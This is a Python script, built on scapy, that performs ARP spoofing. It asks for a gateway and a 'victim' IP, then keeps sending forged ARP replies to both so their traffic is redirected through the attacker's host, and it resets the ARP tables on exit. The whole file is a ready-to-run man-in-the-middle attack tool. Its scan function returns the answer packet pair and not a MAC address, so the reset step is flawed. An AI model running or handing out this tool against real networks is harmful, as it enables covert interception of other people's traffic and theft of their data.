#! python3
import scapy.all as scapy
import optparse as op
from time import sleep

def scan(ip_range):
    arp_packet = scapy.ARP(pdst=ip_range)
    # print(arp_packet.show())
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # print(broadcast.show())
    arp_with_broadcast = broadcast / arp_packet
    answered, unanswered = scapy.srp(arp_with_broadcast,timeout = 1, verbose=False)
    # return answered[0][1][1].hwsrc
    for element in answered:
        return element


def spoof(src_ip, dest_ip):
    arp_packet = scapy.ARP(pdst=dest_ip, op=2, psrc=src_ip)
    scapy.send(arp_packet, verbose=False)

def reset_arp_table():
    response_to_gateway = scapy.ARP(pdst=gateway_ip, hwsrc=victim_mac, psrc=victim_ip, op=2)
    response_to_victim = scapy.ARP(pdst=victim_ip, hwsrc=gateway_mac, psrc=gateway_ip, op=2)
    scapy.send(response_to_gateway, count=4, verbose=False)
    scapy.send(response_to_victim, count=4, verbose=False)

def get_arguments():
    parser = op.OptionParser()
    parser.add_option("-g", "--gateway_ip", dest="gateway_ip", help="add gateway ip")
    parser.add_option("-v", "--victim_ip", dest="victim_ip", help="add victim ip")
    options = parser.parse_args()[0]
    gateway_ip = options.gateway_ip
    victim_ip = options.victim_ip
    if not gateway_ip:
        gateway_ip = input("Enter the gateway ip : ")
    if not victim_ip :
        victim_ip = input("Enter the victim ip : ")
    return (gateway_ip, victim_ip)

gateway_ip, victim_ip=get_arguments()
gateway_mac=scan(gateway_ip)
victim_mac=scan(victim_ip)
number_of_packets=0

try:
    while True:
        spoof(victim_ip, gateway_ip)
        spoof(gateway_ip, victim_ip)
        number_of_packets+=2
        print(f"\r[+] Sent {number_of_packets} packets", end="")
        sleep(2)
except KeyboardInterrupt:
    print("\nReseting arp table......")
    reset_arp_table()
